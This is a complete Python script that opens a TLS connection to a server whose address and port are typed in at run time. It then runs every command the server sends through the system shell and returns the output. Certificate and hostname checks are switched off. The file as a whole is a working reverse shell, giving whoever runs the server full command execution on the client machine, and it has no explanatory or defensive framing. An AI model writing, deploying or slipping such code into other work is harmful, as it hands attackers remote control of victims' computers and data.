import socket
import ssl
import subprocess

# Function to execute commands on the client and send output to the server
def execute_command(command):
    try:
        # Execute the command and capture the output
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

# Handle server communication
def handle_client(client_socket, addr):
    print(f"Connection established with {addr}")
    
    while True:
        # Receive the command from the server
        command = client_socket.recv(1024).decode().strip()
        if not command:
            break  # Exit the loop if no command is received
        
        print(f"Received command: {command}")
        
        # Execute the command and send back the output
        output = execute_command(command)
        client_socket.send(output.encode())

    client_socket.close()

# Start the client
def start_client():
    server_ip = input("Enter server IP address: ")
    port = int(input("Enter server port: "))

    # Create the client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Create an SSL context for the client
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.check_hostname = False  # Disable hostname checking (not recommended for production)
    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification (for testing)

    # Wrap the socket in SSL using the context
    client_socket = context.wrap_socket(client_socket, server_hostname=server_ip)

    # Connect to the server
    client_socket.connect((server_ip, port))

    # Handle client communication
    handle_client(client_socket, server_ip)

# Run the client program
start_client()
